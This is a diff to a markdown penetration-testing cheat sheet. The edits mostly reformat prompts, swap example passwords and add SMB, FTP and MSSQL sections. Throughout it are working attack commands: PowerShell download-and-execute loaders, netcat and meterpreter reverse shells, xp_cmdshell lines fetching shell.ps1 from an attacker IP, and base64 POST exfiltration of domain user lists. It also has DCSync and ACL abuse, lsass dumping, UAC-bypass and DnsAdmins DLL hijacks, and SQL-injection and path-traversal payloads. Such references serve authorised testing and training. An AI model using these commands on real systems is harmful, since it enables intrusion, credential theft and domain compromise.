@@ -65,7 +65,7 @@ Invoke-Expression (UTF-16LE):
 
 ```
 root@kali:$ echo -n "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/[1]')" | iconv -t UTF-16LE | base64 -w0; echo
-PS> powershell -NoP -EncodedCommand <BASE64_COMMAND_HERE>
+PS > powershell -NoP -EncodedCommand <BASE64_COMMAND_HERE>
 ```
 
 1. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
@@ -73,8 +73,8 @@ PS> powershell -NoP -EncodedCommand <BASE64_COMMAND_HERE>
 Invoke-WebRequest + `nc.exe` **[1]**:
 
 ```
-PS> powershell -NoP IWR -Uri http://127.0.0.1/nc.exe -OutFile C:\Windows\Temp\nc.exe
-PS> cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
+PS > powershell -NoP IWR -Uri http://127.0.0.1/nc.exe -OutFile C:\Windows\Temp\nc.exe
+PS > cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
 ```
 
 1. [eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)
@@ -92,9 +92,9 @@ Powershell + msfvenom:
 
 ```
 root@kali:$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=127.0.0.1 LPORT=1337 -f exe > met.exe
-PS> (New-Object Net.WebClient).DownloadFile("met.exe", "$env:TEMP\met.exe")
+PS > (New-Object Net.WebClient).DownloadFile("met.exe", "$env:TEMP\met.exe")
 ...start metasploit listener...
-PS> Start-Process "$env:TEMP\met.exe"
+PS > Start-Process "$env:TEMP\met.exe"
 ```
 
 Powershell + unicorn **[1]**:
@@ -103,7 +103,7 @@ Powershell + unicorn **[1]**:
 root@kali:$ ./unicorn.py windows/meterpreter/reverse_https LHOST 443
 root@kali:$ service postgresql start
 root@kali:$ msfconsole -r unicorn.rc
-PS> powershell -NoP IEX (New-Object Net.WebClient).DownloadString('powershell_attack.txt')
+PS > powershell -NoP IEX (New-Object Net.WebClient).DownloadString('powershell_attack.txt')
 ```
 
 1. [github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
@@ -161,34 +161,40 @@ user@remote:$ export TERM=xterm
 
 ### Windows
 
+
+#### Base64
+
 * [github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/pwsh_base64_transport.py)
 
 Local file to base64:
 
 ```
-Cmd> certutil -encode <FILE_TO_ENCODE> C:\Windows\Temp\encoded.b64
-Cmd> type C:\Windows\Temp\encoded.b64
+Cmd > certutil -encode <FILE_TO_ENCODE> C:\Windows\Temp\encoded.b64
+Cmd > type C:\Windows\Temp\encoded.b64
 ```
 
 Local string to base64 and POST:
 
 ```
-PS> $str = cmd /c net user /domain
-PS> $base64str = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
-PS> Invoke-RestMethod -Uri http://127.0.0.1/msg -Method POST -Body $base64str
+PS > $str = cmd /c net user /domain
+PS > $base64str = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+PS > Invoke-RestMethod -Uri http://127.0.0.1/msg -Method POST -Body $base64str
 ```
 
 
 
 ### Linux2Linux
 
+
+#### /dev/tcp
+
 ```
 # Sender:
 root@kali:$ nc -w3 -lvnp 1234 < file.txt
-# Recepient:
+# Recipient:
 www-data@victim:$ bash -c 'cat < /dev/tcp/127.0.0.1/1234 > /tmp/.file'
 
-# Recepient:
+# Recipient:
 root@kali:$ nc -w3 -lvnp 1234 > file.txt
 # Sender:
 www-data@victim:$ bash -c 'cat < file.txt > /dev/tcp/127.0.0.1/1234'
@@ -200,14 +206,73 @@ www-data@victim:$ bash -c 'cat < file.txt > /dev/tcp/127.0.0.1/1234'
 
 * [blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
 
+
+#### Base64
+
 Full base64 file transfer from Linux to Windows:
 
 ```
 root@kali:$ base64 -w0 tunnel.aspx; echo
 ...BASE64_CONTENTS...
-PS> Add-Content -Encoding UTF8 tunnel.b64 "<BASE64_CONTENTS>" -NoNewLine
+PS > Add-Content -Encoding UTF8 tunnel.b64 "<BASE64_CONTENTS>" -NoNewLine
 PS > $data = Get-Content -Raw tunnel.b64
 PS > [IO.File]::WriteAllBytes("C:\inetpub\wwwroot\uploads\tunnel.aspx", [Convert]::FromBase64String($data))
+```
+
+
+#### SMD
+
+##### impacket-smbserver
+
+SMB server (communicate with Windows **[1]**):
+
+```
+root@kali:$ impacket-smbserver -smb2support files `pwd`
+```
+
+1. [serverfault.com/a/333584/554483](https://serverfault.com/a/333584/554483)
+
+Mount SMB in Windows with `net use`:
+
+```
+root@kali:$ impacket-smbserver -username snovvcrash -password 'Passw0rd1!' -smb2support share `pwd`
+PS > net use Z: \\10.10.14.16\share
+PS > net use Z: \\10.10.14.16\share /u:snovvcrash 'Passw0rd1!'
+```
+
+Mount SMB in Windows with `New-PSDrive`:
+
+```
+root@kali:$ impacket-smbserver -username snovvcrash -password 'Passw0rd1!' -smb2support share `pwd`
+PS > $pass = 'Passw0rd1!' | ConvertTo-SecureString -AsPlainText -Force
+PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $pass)
+PS > New-PSDrive -name Z -root \\10.10.14.16\share -Credential $cred -PSProvider 'filesystem'
+PS > cd Z:
+```
+
+##### net share
+
+```
+Cmd > net share pentest=c:\smb_pentest /GRANT:"Anonymous Logon,FULL" /GRANT:"Everyone,FULL"
+Or
+Cmd > net share pentest=c:\smb_pentest /GRANT:"Administrator,FULL"
+Cmd > net share pentest /delete
+```
+
+
+#### FTP
+
+```
+$ python -m pip install pyftpdlib
+$ python -m pyftpdlib -Dwp 2121
+Cmd > cd C:\Windows\System32\spool\drivers\color
+Cmd > echo 'open 127.0.0.1 2121' > ftp.txt
+Cmd > echo 'user anonymous' >> ftp.txt
+Cmd > echo 'anonymous' >> ftp.txt
+Cmd > echo 'binary' >> ftp.txt
+Cmd > echo 'put file.bin' >> ftp.txt
+Cmd > echo 'bye' >> ftp.txt
+Cmd > ftp -v -n -s:ftp.txt
 ```
 
 
@@ -242,7 +307,7 @@ msf5 > irb
 Mount:
 
 ```
-root@kali:$ mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=snovvcrash,[pass=qwe123]
+root@kali:$ mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=snovvcrash,[pass='Passw0rd1!']
 ```
 
 Status:
@@ -256,36 +321,6 @@ Unmount:
 
 ```
 root@kali:~# umount /mnt/smb
-```
-
-
-
-### impacket-smbserver
-
-SMB server (communicate with Windows **[1]**):
-
-```
-root@kali:$ impacket-smbserver -smb2support files `pwd`
-```
-
-1. [serverfault.com/a/333584/554483](https://serverfault.com/a/333584/554483)
-
-Mount SMB in Windows with `net use`:
-
-```
-root@kali:$ impacket-smbserver -username snovvcrash -password qwe123 -smb2support share `pwd`
-PS> net use Z: \\10.10.14.16\share
-PS> net use Z: \\10.10.14.16\share /u:snovvcrash qwe123
-```
-
-Mount SMB in Windows with `New-PSDrive`:
-
-```
-root@kali:$ impacket-smbserver -username snovvcrash -password qwe123 -smb2support share `pwd`
-PS> $pass = 'qwe123' | ConvertTo-SecureString -AsPlainText -Force
-PS> $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $pass)
-PS> New-PSDrive -name Z -root \\10.10.14.16\share -Credential $cred -PSProvider 'filesystem'
-PS> cd Z:
 ```
 
 
@@ -313,7 +348,7 @@ root@kali:$ smbclient -N '\\127.0.0.1\Data'
 With user creds:
 
 ```
-root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' qwe123
+root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' 'Passw0rd1!'
 ```
 
 
@@ -321,8 +356,8 @@ root@kali:$ smbclient -U snovvcrash '\\127.0.0.1\Users' qwe123
 ### crackmapexec
 
 ```
-root@kali:$ crackmapexec smb 127.0.0.1 -u nullinux_users.txt -p 'qwe123' --shares [--continue-on-success]
-root@kali:$ crackmapexec smb 127.0.0.1 -u snovvcrash -p qwe123 --spider-folder 'E\$' --pattern s3cret
+root@kali:$ crackmapexec smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd1!' --shares [--continue-on-success]
+root@kali:$ crackmapexec smb 127.0.0.1 -u snovvcrash -p 'Passw0rd1!' --spider-folder 'E\$' --pattern s3cret
 ```
 
 Same password spraying with Metasploit:
@@ -342,7 +377,7 @@ msf5 auxiliary(scanner/smb/smb_login) > run
 
 ```
 root@kali:$ showmount -e 127.0.0.1
-root@kali:$ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass=qwe123]
+root@kali:$ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass='Passw0rd1!']
 ```
 
 * [resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
@@ -398,7 +433,7 @@ $ ldapsearch -h 127.0.0.1 -x -b "dc=example,dc=local" '(ms-MCS-AdmPwd=*)' ms-MCS
 Simple authentication with ldapsearch:
 
 ```
-$ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=example,DC=local' -w 'passw0rd' -s sub -b 'DC=example,DC=local' |tee ldapsearch.log
+$ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=example,DC=local' -w 'Passw0rd1!' -s sub -b 'DC=example,DC=local' |tee ldapsearch.log
 ```
 
 
@@ -410,7 +445,7 @@ $ ldapsearch -H ldap://127.0.0.1:389/ -x -D 'CN=username,CN=Users,DC=example,DC=
 Enumerate all AD Computers:
 
 ```
-./windapsearch.py -u 'example.local\snovvcrash' -p 'passw0rd' --dc 127.0.0.1 -C
+./windapsearch.py -u 'example.local\snovvcrash' -p 'Passw0rd1!' --dc 127.0.0.1 -C
 ```
 
 
@@ -462,7 +497,7 @@ root@kali:$ python3 -m pip install --upgrade .
 
 ```
 root@kali:$ rpcclient -U '' -N 127.0.0.1
-root@kali:$ rpcclient -U 'snovvcrash%qwe123' 127.0.0.1
+root@kali:$ rpcclient -U 'snovvcrash%Passw0rd1!' 127.0.0.1
 
 rpcclient $> enumdomusers
 rpcclient $> enumdomgroups
@@ -505,8 +540,8 @@ $ ./hashcat64.exe -m 18200 -a 0 -r rules/best64.rule hashes/hash.asprep seclists
 Show domain users with `DONT_REQ_PREAUTH` flag with `PowerView.ps1`:
 
 ```
-PS> . ./PowerView.ps1
-PS> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+PS > . ./PowerView.ps1
+PS > Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 ```
 
 1. [PayloadsAllTheThings/Active Directory Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#krb_as_rep-roasting)
@@ -518,27 +553,27 @@ PS> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 Potential risk -- "Exchange Windows Permissions" group:
 
 ```
-PS> net group "Exchange Windows Permissions" snovvcrash /ADD /DOMAIN
-PS> net group "Remote Management Users" snovvcrash /ADD /DOMAIN
+PS > net group "Exchange Windows Permissions" snovvcrash /ADD /DOMAIN
+PS > net group "Remote Management Users" snovvcrash /ADD /DOMAIN
 Or
-PS> Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members snovvcrash
-PS> Add-ADGroupMember -Identity 'Remote Management Users' -Members snovvcrash
+PS > Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members snovvcrash
+PS > Add-ADGroupMember -Identity 'Remote Management Users' -Members snovvcrash
 ```
 
 
 #### Powerview (v2)
 
 ```
-PS> Add-ObjectAcl -TargetDistinguishedName 'DC=example,DC=local' -PrincipalName snovvcrash -Rights DCSync -Verbose
+PS > Add-ObjectAcl -TargetDistinguishedName 'DC=example,DC=local' -PrincipalName snovvcrash -Rights DCSync -Verbose
 ```
 
 
 #### Powerview (v3)
 
 ```
-PS> $pass = 'qwe123' |ConvertTo-SecureString -AsPlainText -Force
-PS> $cred = New-Object System.Management.Automation.PSCredential('EXAMPLE\snovvcrash', $pass)
-PS> Add-DomainObjectAcl -TargetIdentity 'DC=example,DC=local' -PrincipalIdentity snovvcrash -Credential $cred -Rights DCSync -Verbose
+PS > $pass = 'Passw0rd1!' |ConvertTo-SecureString -AsPlainText -Force
+PS > $cred = New-Object System.Management.Automation.PSCredential('EXAMPLE\snovvcrash', $pass)
+PS > Add-DomainObjectAcl -TargetIdentity 'DC=example,DC=local' -PrincipalIdentity snovvcrash -Credential $cred -Rights DCSync -Verbose
 ```
 
 
@@ -546,7 +581,7 @@ PS> Add-DomainObjectAcl -TargetIdentity 'DC=example,DC=local' -PrincipalIdentity
 
 ```
 root@kali:$ ntlmrelayx.py -t ldap://127.0.0.1 --escalate-user snovvcrash
-root@kali:$ secretsdump.py EXAMPLE.LOCAL/snovvcrash:qwe123@127.0.0.1 -just-dc
+root@kali:$ secretsdump.py EXAMPLE.LOCAL/snovvcrash:'Passw0rd1!'@127.0.0.1 -just-dc
 ```
 
 1. [dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
@@ -556,7 +591,7 @@ root@kali:$ secretsdump.py EXAMPLE.LOCAL/snovvcrash:qwe123@127.0.0.1 -just-dc
 #### aclpwn.py
 
 ```
-root@kali:$ aclpwn -f snovvcrash -ft user -t EXAMPLE.LOCAL -tt domain -d EXAMPLE.LOCAL -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p qwe123 -sp qwe123
+root@kali:$ aclpwn -f snovvcrash -ft user -t EXAMPLE.LOCAL -tt domain -d EXAMPLE.LOCAL -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p 'Passw0rd1!' -sp 'Passw0rd1!'
 ```
 
 1. [www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
@@ -571,21 +606,21 @@ root@kali:$ aclpwn -f snovvcrash -ft user -t EXAMPLE.LOCAL -tt domain -d EXAMPLE
 4. Применить изменения.
 
 ```
-PS> Import-Module ActiveDirectory
-PS> $acl = get-acl "ad:DC=example,DC=local"
-PS> $user = Get-ADUser snovvcrash
-PS> $sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
-PS> $objectguid = new-object Guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
-PS> $identity = [System.Security.Principal.IdentityReference] $sid
-PS> $adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
-PS> $type = [System.Security.AccessControl.AccessControlType] "Allow"
-PS> $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
-PS> $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
-PS> $acl.AddAccessRule($ace)
-PS> $objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
-PS> $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
-PS> $acl.AddAccessRule($ace)
-PS> Set-acl -aclobject $acl "ad:DC=example,DC=local"
+PS > Import-Module ActiveDirectory
+PS > $acl = get-acl "ad:DC=example,DC=local"
+PS > $user = Get-ADUser snovvcrash
+PS > $sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
+PS > $objectguid = new-object Guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+PS > $identity = [System.Security.Principal.IdentityReference] $sid
+PS > $adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
+PS > $type = [System.Security.AccessControl.AccessControlType] "Allow"
+PS > $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
+PS > $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
+PS > $acl.AddAccessRule($ace)
+PS > $objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+PS > $ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
+PS > $acl.AddAccessRule($ace)
+PS > Set-acl -aclobject $acl "ad:DC=example,DC=local"
 ```
 
 1. [github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)
@@ -594,7 +629,7 @@ PS> Set-acl -aclobject $acl "ad:DC=example,DC=local"
 #### Mimikatz
 
 ```
-PS> lsadump::dcsync /domain:EXAMPLE.LOCAL /user:krbtgt@EXAMPLE.LOCAL
+PS > lsadump::dcsync /domain:EXAMPLE.LOCAL /user:krbtgt@EXAMPLE.LOCAL
 ```
 
 1. [adsecurity.org/?p=1729](https://adsecurity.org/?p=1729)
@@ -613,12 +648,12 @@ PS> lsadump::dcsync /domain:EXAMPLE.LOCAL /user:krbtgt@EXAMPLE.LOCAL
 
 ```
 root@kali:$ msfvenom -p windows/x64/exec cmd='c:\users\snovvcrash\documents\nc.exe 127.0.0.1 1337 -e powershell' -f dll > inject.dll
-PS> dnscmd.exe <HOSTNAME> /Config /ServerLevelPluginDll c:\users\snovvcrash\desktop\i.dll
-PS> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
-PS> (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
+PS > dnscmd.exe <HOSTNAME> /Config /ServerLevelPluginDll c:\users\snovvcrash\desktop\i.dll
+PS > Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+PS > (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
 
-PS> reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
-PS> (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
+PS > reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
+PS > (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
 ```
 
 1. [medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)
@@ -631,8 +666,8 @@ PS> (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
 ### Azure Admins
 
 ```
-PS> . ./Azure-ADConnect.ps1
-PS> Azure-ADConnect -server 127.0.0.1 -db ADSync
+PS > . ./Azure-ADConnect.ps1
+PS > Azure-ADConnect -server 127.0.0.1 -db ADSync
 ```
 
 * [github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1)
@@ -663,15 +698,15 @@ root@kali:$ ./BloodHound --no-sandbox
 Collect graphs via `Ingestors/SharpHound.ps1`:
 
 ```
-PS> . .\SharpHound.ps1
-PS> Invoke-Bloodhound -CollectionMethod All -Domain EXAMPLE.LOCAL -LDAPUser snovvcrash -LDAPPass qwe123
+PS > . .\SharpHound.ps1
+PS > Invoke-Bloodhound -CollectionMethod All -Domain EXAMPLE.LOCAL -LDAPUser snovvcrash -LDAPPass 'Passw0rd1!'
 ```
 
 Collect graphs via `bloodHound.py` **[1]** (with BloodHound running):
 
 ```
 root@kali:$ git clone https://github.com/fox-it/BloodHound.py ~/tools/BloodHound.py && cd ~/tools/BloodHound.py && python setup.py install && cd -
-root@kali:$ bloodhound-python -c All -u snovvcrash -p qwe123 -d EXAMPLE.LOCAL -ns 127.0.0.1
+root@kali:$ bloodhound-python -c All -u snovvcrash -p 'Passw0rd1!' -d EXAMPLE.LOCAL -ns 127.0.0.1
 ```
 
 1. [github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
@@ -683,38 +718,38 @@ root@kali:$ bloodhound-python -c All -u snovvcrash -p qwe123 -d EXAMPLE.LOCAL -n
 List all domain users:
 
 ```
-PS> Get-ADUser -Filter * -SearchBase "DC=example,DC=local" | select Name,SID
+PS > Get-ADUser -Filter * -SearchBase "DC=example,DC=local" | select Name,SID
 Or
-PS> net user /DOMAIN
+PS > net user /DOMAIN
 ```
 
 List all domain groups:
 
 ```
-PS> Get-ADGroup -Filter * -SearchBase "DC=example,DC=local" | select Name,SID
+PS > Get-ADGroup -Filter * -SearchBase "DC=example,DC=local" | select Name,SID
 Or
-PS> net group /DOMAIN
+PS > net group /DOMAIN
 ```
 
 List all user's groups:
 
 ```
-PS> Get-ADPrincipalGroupMembership snovvcrash | select Name
+PS > Get-ADPrincipalGroupMembership snovvcrash | select Name
 ```
 
 Create new domain user:
 
 ```
-PS> net user snovvcrash qwe321456 /ADD /DOMAIN
+PS > net user snovvcrash qwe321456 /ADD /DOMAIN
 Or
-PS> New-ADUser -Name snovvcrash -SamAccountName snovvcrash -Path "CN=Users,DC=example,DC=local" -AccountPassword(ConvertTo-SecureString 'qwe321456' -AsPlainText -Force) -Enabled $true
+PS > New-ADUser -Name snovvcrash -SamAccountName snovvcrash -Path "CN=Users,DC=example,DC=local" -AccountPassword(ConvertTo-SecureString 'qwe321456' -AsPlainText -Force) -Enabled $true
 ```
 
 List deleted AD objects (AD recycle bin):
 
 ```
-PS> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
-PS> Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_NAME>' -IncludeDeletedObjects -Properties * |ft
+PS > Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
+PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_NAME>' -IncludeDeletedObjects -Properties * |ft
 ```
 
 * [activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/](https://activedirectorypro.com/enable-active-directory-recycle-bin-server-2016/)
@@ -723,30 +758,30 @@ PS> Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_NA
 Get DC names:
 
 ```
-PS> $ldapFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
-PS> $searcher = [ADSISearcher]$ldapFilter
-PS> $searcher.FindAll()
-PS> $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() }
+PS > $ldapFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
+PS > $searcher = [ADSISearcher]$ldapFilter
+PS > $searcher.FindAll()
+PS > $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() }
 Or
-PS> ([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll() |ForEach-Object { $_.GetDirectoryEntry() }
+PS > ([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll() |ForEach-Object { $_.GetDirectoryEntry() }
 
-PS> [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name
+PS > [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name
 
-Cmd> nltest /dsgetdc:example.local
+Cmd > nltest /dsgetdc:example.local
 
-PS> $DomainName = (Get-ADDomain).DNSRoot
-PS> $AllDCs = Get-ADDomainController -Filter * -Server $DomainName | Select-Object Hostname,Ipv4address,isglobalcatalog,site,forest,operatingsystem
+PS > $DomainName = (Get-ADDomain).DNSRoot
+PS > $AllDCs = Get-ADDomainController -Filter * -Server $DomainName | Select-Object Hostname,Ipv4address,isglobalcatalog,site,forest,operatingsystem
 
-PS> $AllDCs = (Get-ADForest).GlobalCatalogs
+PS > $AllDCs = (Get-ADForest).GlobalCatalogs
 ```
 
 Get Domain NetBIOS name:
 
 ```
-PS> ([ADSI]"LDAP://example.local").dc
+PS > ([ADSI]"LDAP://example.local").dc
 
-PS> $DomainName = (Get-ADDomain).DNSRoot
-PS> (Get-ADDomain -Server $DomainName).NetBIOSName
+PS > $DomainName = (Get-ADDomain).DNSRoot
+PS > (Get-ADDomain -Server $DomainName).NetBIOSName
 ```
 
 
@@ -777,11 +812,11 @@ $ pip install requests twisted pyOpenSSL lxml service_identity
 Run:
 
 ```
-$ python -m peas --check -u 'CORP\snovvcrash' -p 'qwe123' mx.corp.ru
-$ python -m peas --list-unc='\\DC2' -u 'CORP\snovvcrash' -p 'qwe123' mx.corp.ru
-$ python -m peas --list-unc='\\DC2\SYSVOL' -u 'CORP\snovvcrash' -p 'qwe123' mx.corp.ru
-$ python -m peas --list-unc='\\DC2\SYSVOL\corp.ru' -u 'CORP\snovvcrash' -p 'qwe123' mx.corp.ru
-$ python -m peas --list-unc='\\DC2\NETLOGON' -u 'CORP\snovvcrash' -p 'qwe123' mx.corp.ru
+$ python -m peas --check -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.ru
+$ python -m peas --list-unc='\\DC2' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.ru
+$ python -m peas --list-unc='\\DC2\SYSVOL' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.ru
+$ python -m peas --list-unc='\\DC2\SYSVOL\corp.ru' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.ru
+$ python -m peas --list-unc='\\DC2\NETLOGON' -u 'CORP\snovvcrash' -p 'Passw0rd1!' mx.corp.ru
 ```
 
 
@@ -796,7 +831,7 @@ $ python -m peas --list-unc='\\DC2\NETLOGON' -u 'CORP\snovvcrash' -p 'qwe123' mx
 * [download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)
 
 ```
-PS> .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
+PS > .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
 $ pypykatz lsa minidump lsass.dmp
 ```
 
@@ -867,13 +902,13 @@ root@kali:$ i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared
 Upload `srrstr.dll` to `C:\Users\%USERNAME%\AppData\Local\Microsoft\WindowsApps\srrstr.dll` and check it:
 
 ```
-PS> rundll32.exe srrstr.dll,xyz
+PS > rundll32.exe srrstr.dll,xyz
 ```
 
 Exec and get a shell ("requires an interactive window station"):
 
 ```
-PS> cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+PS > cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 ```
 
 * [egre55.github.io/system-properties-uac-bypass](https://egre55.github.io/system-properties-uac-bypass)
@@ -934,7 +969,7 @@ root@kali:$ msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
 Exec with `msbuild.exe` and get a shell:
 
 ```
-PS> cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
+PS > cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xml
 ```
 
 * [github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
@@ -1030,7 +1065,7 @@ root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//pr
 ### MySQL (MariaDB)
 
 ```
-root@kali:$ mysql -u snovvcrash -p'qwe123' -e 'show databases;'
+root@kali:$ mysql -u snovvcrash -p'Passw0rd1!' -e 'show databases;'
 ```
 
 
@@ -1059,7 +1094,7 @@ root@kali:$ mysql -u snovvcrash -p'qwe123' -e 'show databases;'
 #### sqsh
 
 ```
-root@kali:$ sqsh -S 127.0.0.1 -U 'EXAMPLE\snovvcrash' -P 'qwe123'
+root@kali:$ sqsh -S 127.0.0.1 -U 'EXAMPLE\snovvcrash' -P 'Passw0rd1!'
 1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.234/shell.ps1')"
 2> GO
 ```
@@ -1068,9 +1103,29 @@ root@kali:$ sqsh -S 127.0.0.1 -U 'EXAMPLE\snovvcrash' -P 'qwe123'
 #### mssqlclient.py
 
 ```
-root@kali:$ mssqlclient.py EXAMPLE/snovvcrash:'qwe123'@127.0.0.1 [-windows-auth]
+root@kali:$ mssqlclient.py EXAMPLE/snovvcrash:'Passw0rd1!'@127.0.0.1 [-windows-auth]
 SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.234/shell.ps1\")"
 ```
+
+
+#### mssql-cli
+
+* [github.com/dbcli/mssql-cli](https://github.com/dbcli/mssql-cli)
+
+```
+root@kali:$ python -m pip install mssql-cli
+root@kali:$ mssql-cli -S 127.0.0.1 -U 'EXAMPLE\snovvcrash' -P 'Passw0rd1!'
+```
+
+
+#### DBeaver
+
+* [DBeaver Community](https://dbeaver.io/)
+
+
+#### DbVisualizer
+
+* [DbVisualizer](https://www.dbvis.com/)
 
 
 
@@ -1202,7 +1257,7 @@ id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (myt
 POST /index.php HTTP/1.1
 Host: 127.0.0.1
 
-name=snovvcrash&email=admin%example.com++++++++++11&password=qwe123
+name=snovvcrash&email=admin%example.com++++++++++11&password=qwe12345
 ```
 
